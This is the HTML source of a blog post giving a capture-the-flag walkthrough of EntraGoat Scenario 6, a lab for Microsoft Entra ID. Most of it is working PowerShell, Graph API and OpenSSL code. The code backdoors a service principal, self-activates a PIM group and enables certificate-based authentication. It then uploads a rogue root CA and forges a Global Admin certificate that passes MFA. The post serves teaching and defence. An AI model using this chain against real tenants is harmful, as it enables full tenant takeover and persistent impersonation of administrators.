<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID | TomerN</title>
<meta name="keywords" content="">
<meta name="description" content="Certificate Bypass Authority–Root Access Granted
EntraGoat Scenario 6 details a privilege escalation technique in Microsoft Entra ID where the player begins with low-privileged credentials and achieves Global Administrator access by chaining misconfigured service principals, over-permissive app roles, and legitimate certificate-based authentication (CBA) functionality.
Using leaked credentials from a legacy service principal, the attacker pivots through owned identity, abuses privileged permissions to modify tenant-wide settings, enables CBA via a user eligible for Privileged Identity Management (PIM) for Groups, and uploads a rogue root certificate authority. This results in passwordless, MFA-compliant impersonation of a Global Admin—enabling complete tenant takeover and persistence.">
<meta name="author" content="Tomer Nahum, Jonathan Elkabas">
<link rel="canonical" href="http://localhost:1313/posts/scenario6/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.fed13c992360e4d7010e740c7b8d87665399d4995b4155fa8c51ba9957c69fb4.css" integrity="sha256-/tE8mSNg5NcBDnQMe42HZlOZ1JlbQVX6jFG6mVfGn7Q=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/scenario6/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><html>

<body>

</body>
</html><meta property="og:url" content="http://localhost:1313/posts/scenario6/">
  <meta property="og:site_name" content="TomerN">
  <meta property="og:title" content="EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID">
  <meta property="og:description" content="Certificate Bypass Authority–Root Access Granted EntraGoat Scenario 6 details a privilege escalation technique in Microsoft Entra ID where the player begins with low-privileged credentials and achieves Global Administrator access by chaining misconfigured service principals, over-permissive app roles, and legitimate certificate-based authentication (CBA) functionality.
Using leaked credentials from a legacy service principal, the attacker pivots through owned identity, abuses privileged permissions to modify tenant-wide settings, enables CBA via a user eligible for Privileged Identity Management (PIM) for Groups, and uploads a rogue root certificate authority. This results in passwordless, MFA-compliant impersonation of a Global Admin—enabling complete tenant takeover and persistence.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-14T00:14:27+03:00">
    <meta property="article:modified_time" content="2025-08-14T00:14:27+03:00">
      <meta property="og:image" content="http://localhost:1313/images/tomer.jpg">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/images/tomer.jpg">
<meta name="twitter:title" content="EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID">
<meta name="twitter:description" content="Certificate Bypass Authority–Root Access Granted
EntraGoat Scenario 6 details a privilege escalation technique in Microsoft Entra ID where the player begins with low-privileged credentials and achieves Global Administrator access by chaining misconfigured service principals, over-permissive app roles, and legitimate certificate-based authentication (CBA) functionality.
Using leaked credentials from a legacy service principal, the attacker pivots through owned identity, abuses privileged permissions to modify tenant-wide settings, enables CBA via a user eligible for Privileged Identity Management (PIM) for Groups, and uploads a rogue root certificate authority. This results in passwordless, MFA-compliant impersonation of a Global Admin—enabling complete tenant takeover and persistence.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID",
      "item": "http://localhost:1313/posts/scenario6/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID",
  "name": "EntraGoat Scenario 6: Exploiting Chained Misconfigurations to Impersonate Global Admin in Entra ID",
  "description": "Certificate Bypass Authority–Root Access Granted EntraGoat Scenario 6 details a privilege escalation technique in Microsoft Entra ID where the player begins with low-privileged credentials and achieves Global Administrator access by chaining misconfigured service principals, over-permissive app roles, and legitimate certificate-based authentication (CBA) functionality.\nUsing leaked credentials from a legacy service principal, the attacker pivots through owned identity, abuses privileged permissions to modify tenant-wide settings, enables CBA via a user eligible for Privileged Identity Management (PIM) for Groups, and uploads a rogue root certificate authority. This results in passwordless, MFA-compliant impersonation of a Global Admin—enabling complete tenant takeover and persistence.\n",
  "keywords": [
    
  ],
  "articleBody": "Certificate Bypass Authority–Root Access Granted EntraGoat Scenario 6 details a privilege escalation technique in Microsoft Entra ID where the player begins with low-privileged credentials and achieves Global Administrator access by chaining misconfigured service principals, over-permissive app roles, and legitimate certificate-based authentication (CBA) functionality.\nUsing leaked credentials from a legacy service principal, the attacker pivots through owned identity, abuses privileged permissions to modify tenant-wide settings, enables CBA via a user eligible for Privileged Identity Management (PIM) for Groups, and uploads a rogue root certificate authority. This results in passwordless, MFA-compliant impersonation of a Global Admin—enabling complete tenant takeover and persistence.\nAttack path overview Initial foothold story: The attacker obtains hardcoded client credentials for a legacy automation service principal embedded in an old PowerShell repository. Pivot via ownership: The legacy service principal is found to own another service principal. Using Application.ReadWrite.OwnedBy, the attacker backdoors the second service principal by adding a secret and pivots to it. Tenant configuration abuse: The second service principal has Organization.ReadWrite.All permission. While not capable of managing users or roles, this permission allows modification of tenant-wide configurations, including authentication settings. Certificate-based authentication (CBA) enablement via group-based PIM assignment: A user the attacker has access to is found to be PIM-eligible for a group that holds the Authentication Policy Administrator role. After activating membership, the attacker enables CBA across the tenant. Establishing trust with a malicious root certificate authority (CA): The attacker generates and uploads a rogue root CA to the tenant, effectively making it a trusted identity provider. Impersonation of Global Admin: Finally, the attacker crafts a client certificate for a Global Admin account, signs it with the malicious root CA, and uses CBA to authenticate—achieving passwordless, MFA-compliant authentication. Attack flow Figure 1 shows the flow of this attack.\nFigure 1. Flow of the Certificate Bypass Authority–Root Access Granted attack scenario\nWhy security teams need to understand Entra ID misconfigurations This attack chain takes advantage of both common misconfigurations and foundational design patterns in Entra ID that are often misunderstood or neglected in real-world environments.\nLegacy automation debt is real. Service principals created for automation may remain unmanaged after deployment. Over time, this can lead to excessive permissions and ownership over other service principals, creating hidden privilege chains. Additionally, poor secret management—such as hardcoded credentials in scripts—often remain in place once “everything is working,” resulting in long-lived and unmonitored access paths. Service principal ownership grants credential management rights. Many organizations don’t audit service principal ownership chains or realize the implications. Permissions don’t exist in isolation. The attack relies on a combination of permissions that appear limited in scope when viewed individually: Application.ReadWrite.OwnedBy allows managing owned service principals by a calling app. Organization.ReadWrite.All grants the ability to modify org-wide configuration settings. Authentication Policy Administrator (or Policy.ReadWrite.AuthenticationMethod) enables and configures CBA. Individually, each permission has a limited and specific scope. However, when combined, they enable configuration changes that allow impersonation of privileged identities through legitimate authentication mechanisms.\nLastly, CBA pierces the tenant’s trust boundary. Once configured, the external CA becomes a valid identity issuer for any user in the tenant. Note: The theoretical background on Entra ID’s application model, as well as certificate-based authentication for both interactive user sign-in and OAuth client assertion flows, was covered in the Scenario 2 blog post. We recommend reviewing it first for proper context.\nHow to detect and defend against exploitation of misconfigurations Misconfigurations like those exploited in this scenario are often overlooked but can lead to full compromise of an Entra ID tenant. To help organizations identify attack paths before they can be abused, Semperis solutions provide indicators of exposures (IOEs) and indicators of compromise (IOCs) to detect and alert on dangerous defaults and misconfigurations, including an indicator for certificate-based authentication persistence and additional checks that assess the security posture of Entra ID environments.\nScenario deep dive: Step-by-step solution walkthrough Let’s take a look at the steps involved in creating a rogue root certificate authority that can unlock the entire Entra ID tenant.\nStep 1: Initial foothold with hardcoded service principal credentials We begin with a leaked secret “found” in a legacy PowerShell repository belonging to an outdated automation script, which Figure 2 shows.\nFigure 2. A leaked secret initiates scenario setup\nUsing those credentials, we authenticate as the service principal, as Figure 3 shows.\nFigure 3. Authenticating as the outdated service principal\nValidation confirms successful authentication for Legacy-Automation-Service. We check the permissions assigned to the identity, and one key permission stands out (Figure 4).\nFigure 4. The Application.ReadWrite.OwnedBy permission assigned to the application identity\nThe Application.ReadWrite.OwnedBy permission grants the caller app the ability to perform the same operations as Application.ReadWrite.All to manage (read**/update/**delete) but only on application objects for which the caller is explicitly listed as an owner. This enables tightly scoped automation scenarios without exposing broad directory-wide application management.\nAs demonstrated in Scenario 1, ownership over a service principal permits credential management, including adding client secrets. To explore potential targets, we enumerate all service principals in the tenant and check which are owned by the currently authenticated identity (Figure 5).\nFigure 5. Enumerating service principals in the Entra ID tenant\nService principal ownership found: DataSync-Production.\nFun fact: It’s impossible to set a service principal as an owner of another service principal via Azure portal UI or Entra admin center, even though the ownership is visible there (Figure 6). Only user identities are allowed.\nFigure 6. Viewing service principal ownership in Entra admin center\nWe configured ownership of the service principal in the setup script by directly calling the Graph API, which does support this operation:\n1 2 3 4 5 6 7 $OwnerParams = @{ \"@odata.id\" = \"https://graph.microsoft.com/v1.0/directoryObjects/$($LegacySP.Id)\" } New-MgServicePrincipalOwnerByRef -ServicePrincipalId $DataSyncSP.Id -BodyParameter $OwnerParams Step 2: Evaluating pivot target We now need to check whether the service principal we own is a viable privilege escalation path. We can reuse the simple Get-ServicePrincipalRoles function from Scenario 1 to enumerate directory role assignments:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 function Get-ServicePrincipalRoles { param([object]$ServicePrincipal) Write-Host \"Checking roles for: $($ServicePrincipal.DisplayName)\" $roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter \"principalId eq '$($ServicePrincipal.Id)'\" -ErrorAction SilentlyContinue $roles = @() if ($roleAssignments) { foreach ($assignment in $roleAssignments) { $roleDefinition = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $assignment.RoleDefinitionId $roles += $roleDefinition Write-Host \" Role: $($roleDefinition.DisplayName)\" -ForegroundColor Green } } else { Write-Host \" No directory roles assigned\" } return $roles } As Figure 7 shows, no directory roles are assigned.\nFigure 7. Initial enumeration returning no directory roles\nBut as we know by now, directory roles aren’t the only vector with service principals. What about app roles (Figure 8)?\nFigure 8. Enumerating app roles\nLike in other scenarios, Directory.Read.All has probably been granted just to simplify the enumeration phase. More interesting, the service principal also has the Organization.ReadWrite.All app role. This permission is often overlooked but has high-impact capabilities. While it doesn’t grant control over users, groups, or roles, it does allow modification of tenant-wide settings such as company branding and authentication policies. In fact, as demonstrated in the excellent SpecterOps research blog Passwordless Persistence and Privilege Escalation in Azure1, this permission is enough to add a new root CA to the Entra ID tenant which then can sign forged user certificates for certificate-based sign-in.\nGiven that, our next step is to add a client secret to the service principal:\n1 2 3 4 5 6 7 8 9 10 11 12 13 $secretDescription = \"Totally-Legit-EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')\" $passwordCredential = @{ DisplayName = $secretDescription EndDateTime = (Get-Date).AddYears(1) } $newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $dataSyncSP.Id -PasswordCredential $passwordCredential $dataSyncSecret = $newSecret.SecretText # save it for later Step 3: Pivoting to the DataSync-Production service principal Although we now have the ability to upload a “trusted” root certificate authority, we’re blocked from leveraging it for impersonation because we can’t enable CBA (Figure 9), which requires either the Policy.ReadWrite.AuthenticationMethod permission or the Authentication Policy Administrator role—neither of which is assigned to the DataSync-Production service principal.\nFigure 9. CBA is forbidden\nAfter exhausting enumeration options under this SP’s identity, we’re at a dead end. No CBA enablement. But WAIT: Have we looked at what our compromised user, terence.mckenna, has access to?\nStep 4: Shifting focus to user context Is Terence a member of any groups (Figure 10)?\nFigure 10. Exploring Terence’s possible group memberships\nNothing beyond the default tenant group.\nAny group ownership (Figure 11)?\nFigure 11. Exploring Terence’s possible group ownership\nNone. Any owned service principals (Figure 12)?\nFigure 12. No Terence-owned service principals\nStill nothing. Any eligible PIM for group assignments?\nFigure 13. At last, group eligibility for Terence\nYes! Terence is eligible for the Authentication Policy Managers group.\nLet’s check what roles the Authentication Policy Managers group is assigned (Figure 14).\nFigure 14. Checking roles for the Authentication Policy Managers group\nThose are highly privileged roles.\nApplication Administrator allows full control over all applications in the tenant, including the ability to add secrets or certificates to any service principal. (We intentionally included this role to support multiple attack paths of varying complexity.) Authentication Policy Administrator, crucially, grants us the ability to enable **CBA—**the exact control we were missing to advance with the attack chain. _____\nNote: Since this is (currently) the final scenario in the EntraGoat series, we intentionally include some of these dead-end enumeration steps to illustrate the thought process behind privilege discovery. Systematic exploration of both service principals and user identities is critical for identifying viable escalation paths in Entra ID.\n_____\nStep 5: Activating PIM assignment Now that we’ve identified eligibility for the Authentication Policy Managers group, we can self-activate the PIM assignment using the Graph API:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 $activationBody = @{ accessId = \"member\" principalId = $currentUser.Id groupId = $authGroup.Id action = \"selfActivate\" scheduleInfo = @{ startDateTime = (Get-Date).ToUniversalTime().ToString(\"o\") expiration = @{ type = \"afterDuration\" duration = \"PT8H\" } } justification = \"Need to configure authentication policies for support tickets\" } Invoke-MgGraphRequest -Method POST ` -Uri \"https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests\" ` -Body $activationBody -ContentType \"application/json\" After a short propagation delay, we can re-check group membership to confirm active status (Figure 15).\nFigure 15. Confirming we’ve established active group membership\nStep 6: Enabling certificate-based authentication With group membership active, we can enable tenant-wide CBA. First, we query the current CBA configuration object (Figure 16).\nFigure 16. That’s a nice function name\nThen, we enable CBA using the following payload for the updated configuration:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 $updateParams = @{ State = \"enabled\" \"@odata.type\" = \"#microsoft.graph.x509CertificateAuthenticationMethodConfiguration\" certificateUserBindings = @( @{ x509CertificateField = \"PrincipalName\" userProperty = \"userPrincipalName\" priority = 1 } ) authenticationModeConfiguration = @{ x509CertificateAuthenticationDefaultMode = \"x509CertificateSingleFactor\" rules = @() } } Update-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration ` -AuthenticationMethodConfigurationId \"X509Certificate\" -BodyParameter $updateParams And we verify that CBA is now enabled (Figure 17).\nFigure 17. CBA enabled\n_____\nNote: This change can also be applied interactively through the Entra admin center by:\nSigning in at https://entra.microsoft.com using Terence’s account Navigate to: Entra ID → Authentication methods → Policies → Certificate-based authentication Toggle state to Enable, as Figure 18 shows Figure 18. CBA enabled through Entra admin center\nDepending on tenant policy, MFA setup may be required for Terence on first login.\n_____\nStep 7: Uploading the malicious root certificate authority Now that CBA is enabled, we pivot back to the DataSync-Production service principal and authenticate using the client secret we previously added to it in order to add a root CA to the tenant’s trusted CAs.\n1 Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $dsCred NOTE: Creating, configuring, and uploading a root CA and client certificate to Entra ID via CLI is a multi-step process with several failure points. Entra ID enforces a specific format for the UPN field in the SAN extension that PowerShell struggles to generate with the required OID. To avoid these pitfalls, we use OpenSSL to generate both the root CA.\nWe begin by setting up the CA structure with the following script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 $opensslBinary = \"C:\\Program Files\\OpenSSL-Win64\\bin\\openssl.exe\" $adminUPN = (Get-MgUser -Filter \"startswith(userPrincipalName,'EntraGoat-admin-s6')\").UserPrincipalName # Setup CA directory structure $caWorkspace = \"$env:TEMP\\EntraGoat-CA\" if (Test-Path $caWorkspace) { Set-Location $env:TEMP Remove-Item $caWorkspace -Recurse -Force } @(\"$caWorkspace\", \"$caWorkspace\\ca\", \"$caWorkspace\\ca\\issued\") | ForEach-Object { New-Item -Path $\\_ -ItemType Directory -Force | Out-Null } # Initialize database (as OpenSSL requires specific format) New-Item -Path \"$caWorkspace\\ca\\index.db\" -ItemType File -Force | Out-Null \"01\" | Out-File \"$caWorkspace\\ca\\serial\" -Encoding ASCII -NoNewline # Root Certificate Authority configuration $caConfig = @\" [ ca ] default\\_ca = entragoat\\_ca [ entragoat\\_ca ] dir = ./ca certs = `$dir new\\_certs\\_dir = `$dir/issued database = `$dir/index.db serial = `$dir/serial RANDFILE = `$dir/.rand certificate = `$dir/entragoat-root.cer private\\_key = `$dir/entragoat-root.key default\\_days = 730 default\\_crl\\_days = 30 default\\_md = sha256 preserve = no policy = trust\\_no\\_one\\_policy [ trust\\_no\\_one\\_policy ] countryName = optional stateOrProvinceName = optional localityName = optional organizationName = optional organizationalUnitName = optional commonName = optional emailAddress = optional [req] x509\\_extensions = user\\_cert req\\_extensions = v3\\_req [ user\\_cert ] subjectAltName = @alt\\_names [ v3\\_req ] subjectAltName = @alt\\_names [alt\\_names] otherName=1.3.6.1.4.1.311.20.2.3;UTF8:$adminUPN \"@ # Client certificate configuration with SAN extension $clientConfig = @\" [req] x509\\_extensions = user\\_cert req\\_extensions = v3\\_req [ user\\_cert ] subjectAltName = @alt\\_names [ v3\\_req ] subjectAltName = @alt\\_names [alt\\_names] otherName=1.3.6.1.4.1.311.20.2.3;UTF8:$adminUPN \"@ # output configuration to files $caConfig | Out-File \"$caWorkspace\\ca.conf\" -Encoding ASCII $clientConfig | Out-File \"$caWorkspace\\client.conf\" -Encoding ASCII Set-Location $caWorkspace # Generate root CA private key \u0026 $opensslBinary genrsa -out ca\\entragoat-root.key 4096 # Create root certificate for entra trust \u0026 $opensslBinary req -new -x509 -days 3650 -key ca\\entragoat-root.key -out ca\\entragoat-root.cer -subj \"/CN=EntraGoat Evil Root CA/O=EntraGoat Security/C=US\" Write-Output \"Root CA certificate path: $caWorkspace\\ca\\entragoat-root.cer\" # upload this to the tenant After the malicious CA infrastructure is prepared, the contents of $caWorkspace\\ca\\ should resemble the files that Figure 19 shows.\n*Figure 19. Output to $caWorkspace\\ca*\nNow we can upload our custom root certificate to Entra ID’s trusted certificate authorities list:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 # Load the root certificate $rootCA = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new(\"$caWorkspace\\ca\\entragoat-root.cer\") $caAuthority = @{ isRootAuthority = $true certificate = [System.Convert]::ToBase64String($rootCA.GetRawCertData()) } # get existing CBA configuration try { $existingConfigs = Invoke-MgGraphRequest -Method GET ` -Uri \"https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration\" if ($existingConfigs.value -and $existingConfigs.value.Count -gt 0) { # Update existing config $configId = $existingConfigs.value[0].id $existingCAs = $existingConfigs.value[0].certificateAuthorities # Add new CA to existing ones $updatedCAs = $existingCAs + @($caAuthority) $updateBody = @{ certificateAuthorities = $updatedCAs } | ConvertTo-Json -Depth 3 $response = Invoke-MgGraphRequest -Method PATCH ` -Uri \"https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration/$configId\" ` -Body $updateBody ` -ContentType \"application/json\" } else { throw \"No existing configuration found\" } } catch { # Create new CBA configuration $body = @{ certificateAuthorities = @($caAuthority) } | ConvertTo-Json -Depth 3 $response = Invoke-MgGraphRequest -Method POST ` -Uri \"https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration\" ` -Body $body ` -ContentType \"application/json\" } And verify that the upload succeeded and the certificate is now trusted by the tenant:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $configs = Invoke-MgGraphRequest -Method GET ` -Uri \"https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration\" $uploadSuccess = $false if ($configs.value -and $configs.value.Count -gt 0) { foreach ($ca in $configs.value[0].certificateAuthorities) { $certBytes = [Convert]::FromBase64String($ca.certificate) $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($certBytes) if ($cert.Thumbprint -eq $rootCA.Thumbprint) { Write-Output \"[+] Root CA successfully uploaded to tenant\" Write-Output \" Thumbprint: $($cert.Thumbprint)\" Write-Output \" Subject: $($cert.Subject)\" $uploadSuccess = $true break } } } if (-not $uploadSuccess) { Write-Output \"[-] Failed to verify root CA upload. Please check the configuration.\" } Great! The root CA is now uploaded (Figure 20).\nFigure 20. Confirmation of successful upload of the root CA\nWith the rogue CA accepted and trusted, we can now issue a client certificate for any identity (including the EntraGoat-admin-s6 user) and sign them using our newly and totally legitimate root CA:\n1 2 3 4 5 6 7 8 9 10 11 # Generate client certificate private key and signing request \u0026 $opensslBinary req -new -sha256 -config client.conf -newkey rsa:4096 -nodes -keyout \"$adminUPN.key\" -out \"$adminUPN.csr\" -subj \"/C=US/ST=Washingaot/L=EvilDistrict/O=EntraGoat/OU=Security/CN=$adminUPN\" # Sign the client certificate with root CA \u0026 $opensslBinary ca -batch -md sha256 -config ca.conf -extensions v3\\_req -out \"$adminUPN.crt\" -infiles \"$adminUPN.csr\" # Convert to PFX format for Windows installation \u0026 $opensslBinary pkcs12 -inkey \"$adminUPN.key\" -in \"$adminUPN.crt\" -export -out \"$adminUPN.pfx\" -password pass:EntraGoat123! Step 8: Passwordless authentication to GA To complete the privileged escalation path:\nInstall the issued .pfx certificate located in $caWorkspace on your local machine (Figure 21). The import password is EntraGoat123!. Figure 21. Installing the .pfx certificate\nFollow the instructions of the Certificate Import Wizard. After installation, confirm the certificate appears in certmgr.msc under Personal → Certificates, as Figure 22 shows. Figure 22. Confirmation of our evil root certificate\nNavigate to https://portal.azure.com or https://entra.microsoft.com/. Enter the UPN for the EntraGoat-admin-s6 account. When prompted, select the installed certificate (Figure 23). Figure 23. Selecting the evil root certificate\nStep 9: Troubleshooting CBA and MFA binding If authentication fails with Certificate validation failed*,* it’s likely due to misconfigured certificate parameters or SAN/OID formatting errors.\nHowever, if you successfully reach the **Stay signed in?prompt and are then redirected to Choose a way to sign in, this indicates that:\nThe certificate is valid CBA is enabled But the tenant’s authentication binding policy classifies certificates as single-factor authentication And tenant policies require multifactor authentication for privileged access In that case, the default mode value x509CertificateAuthenticationDefaultMode is set to single-factor x509CertificateSingleFactor and because of that, CBA does not satisfy MFA requirements on its own (Figure 24) and cannot be used to access privileged accounts.\nFigure 24. MFA is still required\nTo resolve this, an Authentication Policy Administrator can update the default binding mode to x509CertificateMultiFactor, allowing CBA to meet MFA requirements (Figure 25).\nFigure 25. Configuring MFA compliance\nWe can set CBA with Terence user’s security context:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # Get current config $current = Invoke-MgGraphRequest -Method GET -Uri \"https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate\" # Check current mode $current.authenticationModeConfiguration.x509CertificateAuthenticationDefaultMode # change to MultiFactor if needed $params = @{ \"@odata.type\" = \"#microsoft.graph.x509CertificateAuthenticationMethodConfiguration\" id = \"X509Certificate\" certificateUserBindings = $current.certificateUserBindings authenticationModeConfiguration = @{ x509CertificateAuthenticationDefaultMode = \"x509CertificateMultiFactor\" x509CertificateDefaultRequiredAffinityLevel = \"low\" rules = @() } includeTargets = $current.includeTargets excludeTargets = $current.excludeTargets state = \"enabled\" issuerHintsConfiguration = $current.issuerHintsConfiguration crlValidationConfiguration = $current.crlValidationConfiguration certificateAuthorityScopes = @() } # Apply changes Invoke-MgGraphRequest -Method PATCH -Uri \"https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate\" -Body ($params | ConvertTo-Json -Depth 10) # Verify change $updated = Invoke-MgGraphRequest -Method GET -Uri \"https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate\" $updated.authenticationModeConfiguration.x509CertificateAuthenticationDefaultMode Alternative (GUI): You can also configure this through the Entra admin portal (Figure 26). Follow this path:\nEntra ID → Authentication methods → Policies → Certificate-based authentication → Configure\nUnder Authentication binding, set Default authentication strength to Multi-factor.\nFigure 26. Configuring MFA-compliance in Entra admin portal\nWith this policy in place, the forged client certificate can now be used to log in as EntraGoat-admin-s6, fully passwordless and MFA-compliant, completing the attack chain and granting Global Administrator access to retrieve the flag from the UI (Figure 27),\nFigure 27. Flag captured\nOnce the scenario is completed, we execute the cleanup script to restore the tenant to its original state.\nLesson learned: Misconfigurations open attack paths This scenario reveals how chained misconfigurations across service principals, app role assignments, and authentication settings can be weaponized to achieve full Entra ID tenant compromise without ever interacting with user passwords.\nIt starts with leaked credentials for a low-privileged legacy service principal, which is common in automation sprawl, and escalates by abusing overlooked permissions of Application.ReadWrite.OwnedBy and Organization.ReadWrite.All.\nBy pivoting between owned service principals and activating a PIM-based group assignment, the attacker enables CBA and uploads a malicious root CA to the tenant.\nFinally, by issuing a forged client certificate for the Global Admin account, changing the tenant’s authentication binding policy rule on certificates to satisfy MFA requirements, and logging in with it via CBA, the attacker bypasses passwords and MFA.\nThis attack path exposes overlooked gaps in trust boundaries and identity architecture, showing how identity has become the new perimeter, susceptible to layered misconfigurations and unintended privilege chains.\nEndnote 1 https://posts.specterops.io/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f\nDisclaimer This content is provided for educational and informational purposes only. It is intended to promote awareness and responsible remediation of security vulnerabilities that may exist on systems you own or are authorized to test. Unauthorized use of this information for malicious purposes, exploitation, or unlawful access is strictly prohibited. We do not endorse or condone any illegal activity and disclaims any liability arising from misuse of the material. Additionally, We do not guarantee the accuracy or completeness of the content and assumes no liability for any damages resulting from its use.\n",
  "wordCount" : "3687",
  "inLanguage": "en",
  "image": "http://localhost:1313/images/tomer.jpg","datePublished": "2025-08-14T00:14:27+03:00",
  "dateModified": "2025-08-14T00:14:27+03:00",
  "author":[{
    "@type": "Person",
    "name": "Tomer Nahum"
  }, {
    "@type": "Person",
    "name": "Jonathan Elkabas"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/scenario6/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "TomerN",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="TomerN (Alt + H)">TomerN</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
